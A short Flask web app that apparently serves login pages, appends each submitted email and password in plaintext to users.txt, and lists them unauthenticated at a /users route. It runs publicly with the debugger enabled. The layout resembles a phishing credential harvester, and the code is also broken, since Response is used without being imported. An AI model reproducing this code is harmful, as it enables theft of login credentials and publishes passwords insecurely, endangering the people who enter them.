from flask import Flask, render_template, request
from werkzeug.security import generate_password_hash

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/new-login')
def new_login():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
   
    with open("users.txt", "a") as file:
        file.write(f"{email}:{password}\n")
    return render_template('success.html')


@app.route('/users')          # <-- add this route
def show_users():
    try:
        with open("users.txt", "r") as file:
            content = file.read()
        return Response(content, mimetype='text/plain')
    except FileNotFoundError:
        return Response("No users yet.", mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=True)
